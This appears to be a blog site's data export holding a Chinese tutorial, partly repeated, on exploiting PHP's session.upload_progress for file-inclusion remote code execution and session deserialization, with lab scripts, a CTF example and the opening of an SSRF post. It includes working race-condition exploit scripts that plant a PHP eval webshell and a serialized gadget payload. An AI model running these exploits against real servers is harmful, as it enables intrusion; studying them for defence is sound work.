知道session文件存放路径，可以尝试默认路径</p>\n<p>3. 具有读取和写入session文件的权限</p>\n</blockquote>\n<h2 id=\"利用session-upload-progress进行反序列化攻击\"><a href=\"#利用session-upload-progress进行反序列化攻击\" class=\"headerlink\" title=\"利用session.upload_progress进行反序列化攻击\"></a>利用session.upload_progress进行反序列化攻击</h2><h3 id=\"测试环境-1\"><a href=\"#测试环境-1\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p><code>session.serialize_handler=php_serialize</code>，其余session相关配置为默认值</p>\n</blockquote>\n<h3 id=\"示例代码-1\"><a href=\"#示例代码-1\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phperror_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle=new TimeNow();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        $this-&gt;ip = &#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p><strong>问题一</strong></p>\n<p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p>\n<p><strong>解答一</strong></p>\n<p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p>\n<p>另外，与文件包含利用一样，也需要进行竞争。</p>\n<h3 id=\"利用脚本-1\"><a href=\"#利用脚本-1\" class=\"headerlink\" title=\"利用脚本\"></a>利用脚本</h3><p>首先利用exp.php脚本构造恶意序列化语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle = new IP();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        //$this-&gt;ip=&#x27;payload&#x27;;        $this-&gt;ip=&#x27;phpinfo();&#x27;;        //$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(&quot;O:4:&quot;,&quot;|O:4:&quot;,$c);echo $d;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>其此利用exp.py脚本进行竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b&#x27;a&#x27; * 1024 *1024*1)    while True:        et.wait()        url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/test5.php&#x27;        headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,        &#x27;DNT&#x27;: &#x27;1&#x27;,        &#x27;Cookie&#x27;: &#x27;PHPSESSID=20190506&#x27;,        &#x27;Connection&#x27;: &#x27;close&#x27;,        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;        &#125;        proxy = &#123;        &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;        &#125;        data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;123&#x27;&#125;        files=&#123;            &#x27;file&#x27;:(r&#x27;|O:4:\\&quot;Door\\&quot;:1:&#123;s:6:\\&quot;handle\\&quot;;O:2:\\&quot;IP\\&quot;:1:&#123;s:2:\\&quot;ip\\&quot;;s:10:\\&quot;phpinfo();\\&quot;;&#125;&#125;&#x27;,f,&#x27;text/plain&#x27;)        &#125;        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=&quot;utf-8&quot;        if len(resp.text)&lt;2000:            print(&#x27;[+++++]retry&#x27;)        else:            print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;))            et.clear()            print(&#x27;success!&#x27;)            if __name__ == &quot;__main__&quot;:    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()</span><br></pre></td></tr></table></figure>\n\n<p>首先在代码里加个代理，利用burp抓包。如下图</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small\"\n                        alt=\"利用session.upload_progress进行文件包含和反序列化渗透\"\n                 ></p>\n<p>这里有几个注意点：</p>\n<blockquote>\n<p>PHPSESSID必须要有，因为要竞争同一个文件</p>\n<p>filename可控，但是在值的最前面加上<code>|</code>,因为最终目的是利用session的反序列化，<code>PHP_SESSION_UPLOAD_PROGRESS</code>只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突</p>\n<p>上传的文件要大些，否则很难竞争成功。我写入是这么大<code>f = io.BytesIO(b&#39;a&#39; * 1024 *1024*1)</code></p>\n<p>filename值中出现汉字时，会出错，所以在利用脚本前，<a class=\"link\"   href=\"https://blog.csdn.net/iriszx999/article/details/82113521\" >一定要修改python源码<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>最后把<code>exp.py</code>中的代理去掉，直接跑<code>exp.py</code>,效果如下。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg\"\n                        alt=\"利用session.upload_progress进行文件包含和反序列化渗透\"\n                 ></p>\n<h3 id=\"几次失败尝试\"><a href=\"#几次失败尝试\" class=\"headerlink\" title=\"几次失败尝试\"></a>几次失败尝试</h3><blockquote>\n<p>其实，利用burp抓到<code>exp.py</code>流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。</p>\n<p>另外，我尝试伪造<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值，但是值中一旦出现<code>|</code>，将会导致数据写入session文件失败。</p>\n</blockquote>\n<h3 id=\"小结-1\"><a href=\"#小结-1\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>利用条件主要是存在session反序列化漏洞。</p>\n<p>从文件包含和反序列化两个利用点，可以发现，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>可以绕过大部分过滤，而且传输的数据也不易发现。</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p><strong>本文主要是利用PHP中的<code>session.upload_progress</code>功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。</strong></p>\n<h2 id=\"php中的session-upload-progress\"><a href=\"#php中的session-upload-progress\" class=\"headerlink\" title=\"php中的session.upload_progress\"></a>php中的session.upload_progress</h2><p>这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。</p>\n<p>在php.ini有以下几个默认选项</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。</p>\n<blockquote>\n<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>\n<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>\n<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>\n<p><code>prefix+name</code>将表示为session中的键名</p>\n</blockquote>\n<h2 id=\"session相关配置及session反序列化\"><a href=\"#session相关配置及session反序列化\" class=\"headerlink\" title=\"session相关配置及session反序列化\"></a>session相关配置及session反序列化</h2><p>因为这个不是本文的重点，所以这里附上几个相关链接。</p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html\" >https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral\" >https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source&#x3D;tuicool&amp;utm_medium&#x3D;referral<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>另外，再添加个session配置中一个重要选项。</p>\n<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p>\n<h2 id=\"利用session-upload-progress进行文件包含利用\"><a href=\"#利用session-upload-progress进行文件包含利用\" class=\"headerlink\" title=\"利用session.upload_progress进行文件包含利用\"></a>利用session.upload_progress进行文件包含利用</h2><h3 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p>关于session相关的一切配置都是默认值</p>\n</blockquote>\n<h3 id=\"示例代码\"><a href=\"#示例代码\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$b=$_GET[&#x27;file&#x27;];include &quot;$b&quot;;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p><strong>问题一</strong></p>\n<p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p>\n<p><strong>解答一</strong></p>\n<p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>\n<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>\n<p><strong>问题二</strong></p>\n<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>\n<p><strong>如何进行rce呢？</strong></p>\n<p><strong>解答二</strong></p>\n<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>\n<h3 id=\"利用脚本\"><a href=\"#利用脚本\" class=\"headerlink\" title=\"利用脚本\"></a>利用脚本</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;TGAO&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;def write(session):    while True:        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)        resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session):    while True:        resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data)        if &#x27;tgao.txt&#x27; in resp.text:            print(resp.text)            event.clear()        else:            print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;:    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()</span><br></pre></td></tr></table></figure>\n\n<p>效果如下图</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg\"\n                        alt=\"利用session.upload_progress进行文件包含和反序列化渗透\"\n                 ></p>\n<h3 id=\"ctf题目\"><a href=\"#ctf题目\" class=\"headerlink\" title=\"ctf题目\"></a>ctf题目</h3><p>在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;    &lt;?php    error_reporting(0);    $file = $_GET[&quot;file&quot;];    $payload = $_GET[&quot;payload&quot;];    if(!isset($file))&#123;        echo &#x27;Missing parameter&#x27;.&#x27;&lt;br&gt;&#x27;;    &#125;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&#x27;hack attacked!!!&#x27;);    &#125;    @include($file);    if(isset($payload))&#123;        $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);        parse_str($url[&#x27;query&#x27;],$query);        foreach($query as $value)&#123;            if (preg_match(&quot;/flag/&quot;,$value)) &#123;                die(&#x27;stop hacking!&#x27;);                exit();            &#125;        &#125;        $payload = unserialize($payload);    &#125;else&#123;       echo &quot;Missing parameters&quot;;    &#125;    ?&gt;    &lt;!--Please test index.php?file=xxx.php --&gt;    &lt;!--Please get the source of hint.php--&gt;    &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量<code>$file</code>加了过滤，不过没什么影响。</p>\n<p>利用思路一样，这里就不再说了，网上也有相应的解法。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p><strong>利用条件</strong></p>\n<blockquote>\n<p>1. 存在文件包含漏洞</p>\n<p>2. 知道session文件存放路径，可以尝试默认路径</p>\n<p>3. 具有读取和写入session文件的权限</p>\n</blockquote>\n<h2 id=\"利用session-upload-progress进行反序列化攻击\"><a href=\"#利用session-upload-progress进行反序列化攻击\" class=\"headerlink\" title=\"利用session.upload_progress进行反序列化攻击\"></a>利用session.upload_progress进行反序列化攻击</h2><h3 id=\"测试环境-1\"><a href=\"#测试环境-1\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p><code>session.serialize_handler=php_serialize</code>，其余session相关配置为默认值</p>\n</blockquote>\n<h3 id=\"示例代码-1\"><a href=\"#示例代码-1\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phperror_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle=new TimeNow();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        $this-&gt;ip = &#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p><strong>问题一</strong></p>\n<p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p>\n<p><strong>解答一</strong></p>\n<p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p>\n<p>另外，与文件包含利用一样，也需要进行竞争。</p>\n<h3 id=\"利用脚本-1\"><a href=\"#利用脚本-1\" class=\"headerlink\" title=\"利用脚本\"></a>利用脚本</h3><p>首先利用exp.php脚本构造恶意序列化语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle = new IP();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        //$this-&gt;ip=&#x27;payload&#x27;;        $this-&gt;ip=&#x27;phpinfo();&#x27;;        //$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(&quot;O:4:&quot;,&quot;|O:4:&quot;,$c);echo $d;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>其此利用exp.py脚本进行竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b&#x27;a&#x27; * 1024 *1024*1)    while True:        et.wait()        url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/test5.php&#x27;        headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,        &#x27;DNT&#x27;: &#x27;1&#x27;,        &#x27;Cookie&#x27;: &#x27;PHPSESSID=20190506&#x27;,        &#x27;Connection&#x27;: &#x27;close&#x27;,        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;        &#125;        proxy = &#123;        &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;        &#125;        data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;123&#x27;&#125;        files=&#123;            &#x27;file&#x27;:(r&#x27;|O:4:\\&quot;Door\\&quot;:1:&#123;s:6:\\&quot;handle\\&quot;;O:2:\\&quot;IP\\&quot;:1:&#123;s:2:\\&quot;ip\\&quot;;s:10:\\&quot;phpinfo();\\&quot;;&#125;&#125;&#x27;,f,&#x27;text/plain&#x27;)        &#125;        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=&quot;utf-8&quot;        if len(resp.text)&lt;2000:            print(&#x27;[+++++]retry&#x27;)        else:            print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;))            et.clear()            print(&#x27;success!&#x27;)            if __name__ == &quot;__main__&quot;:    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()</span><br></pre></td></tr></table></figure>\n\n<p>首先在代码里加个代理，利用burp抓包。如下图</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small\"\n                        alt=\"利用session.upload_progress进行文件包含和反序列化渗透\"\n                 ></p>\n<p>这里有几个注意点：</p>\n<blockquote>\n<p>PHPSESSID必须要有，因为要竞争同一个文件</p>\n<p>filename可控，但是在值的最前面加上<code>|</code>,因为最终目的是利用session的反序列化，<code>PHP_SESSION_UPLOAD_PROGRESS</code>只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突</p>\n<p>上传的文件要大些，否则很难竞争成功。我写入是这么大<code>f = io.BytesIO(b&#39;a&#39; * 1024 *1024*1)</code></p>\n<p>filename值中出现汉字时，会出错，所以在利用脚本前，<a class=\"link\"   href=\"https://blog.csdn.net/iriszx999/article/details/82113521\" >一定要修改python源码<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>最后把<code>exp.py</code>中的代理去掉，直接跑<code>exp.py</code>,效果如下。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg\"\n                        alt=\"利用session.upload_progress进行文件包含和反序列化渗透\"\n                 ></p>\n<h3 id=\"几次失败尝试\"><a href=\"#几次失败尝试\" class=\"headerlink\" title=\"几次失败尝试\"></a>几次失败尝试</h3><blockquote>\n<p>其实，利用burp抓到<code>exp.py</code>流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。</p>\n<p>另外，我尝试伪造<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值，但是值中一旦出现<code>|</code>，将会导致数据写入session文件失败。</p>\n</blockquote>\n<h3 id=\"小结-1\"><a href=\"#小结-1\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>利用条件主要是存在session反序列化漏洞。</p>\n<p>从文件包含和反序列化两个利用点，可以发现，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>可以绕过大部分过滤，而且传输的数据也不易发现。</p>\n"},{"title":"SSRF初探","date":"2022-05-17T15:41:21.000Z","excerpt":"SSRF初探","_content":"\n\n\n![SSRF](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg)\n\n> FreeBuf停更好久，我都忘了自己还有一个FreeBuf账号了，嘿嘿，你们信吗？\n\n在最近一段时间的CTF中，感觉SSRF的题型又多了起来。SSRF这个漏洞也是我自己最喜欢的一个漏洞了，趁寒假没事干，便写了这篇文章总结一下SSRF的几种利用方式。本文多为笔者的学习总结，内容十分详细且丰富，大佬路过还望多多点评。\n\n## 漏洞详情\n\nSSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。\n\nSSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。\n\n如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。![image-20210112220229389](https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small)\n\n**容易出现SSRF的地方有：**\n\n> 1.  社交分享功能：获取超链接的标题等内容进行显示\n>\n> 2.  转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n>\n> 3.  在线翻译：给网址翻译对应网页的内容\n>\n> 4.  图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片\n>\n> 5.  图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验\n>\n> 6.  云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试\n>\n> 7.  网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n>\n> 8.  数据库内置功能：数据库的比如mongodb的copyDatabase函数\n>\n> 9.  邮件系统：比如接收邮件服务器地址\n>\n> 10.  编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等\n>\n> 11.  未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……\n>\n> 12.  从远程服务器请求资源\n>\n\n**SSRF漏洞的危害：**\n\n> 1.  对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。\n>\n> 2.  攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。\n>\n> 3.  对内网Web应用进行指纹识别，识别企业内部的资产信息。\n>\n> 4.  攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。\n>\n> 5.  利用file协议读取服务器本地文件等。\n>\n> 6.  进行跳板攻击等。\n>\n\n## SSRF漏洞相关函数和类\n\n+   file\\_get\\_contents()：将整个文件或一个url所指向的文件读入一个字符串中。\n    \n+   readfile()：输出一个文件的内容。\n    \n+   fsockopen()：打开一个网络连接或者一个Unix 套接字连接。\n    \n+   curl\\_exec()：初始化一个新的会话，返回一个cURL句柄，供curl\\_setopt()，curl\\_exec()和curl\\_close() 函数使用。\n    \n+   fopen()：打开一个文件文件或者 URL。\n    \n+   ......\n    \n\n上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。\n\n### file\\_get\\_contents()\n\n测试代码：\n\n```\n// ssrf.php\n<?php\n$url = $\\_GET\\['url'\\];;\necho file\\_get\\_contents($url);\n?>\n```\n\n上述测试代码中，file\\_get\\_contents() 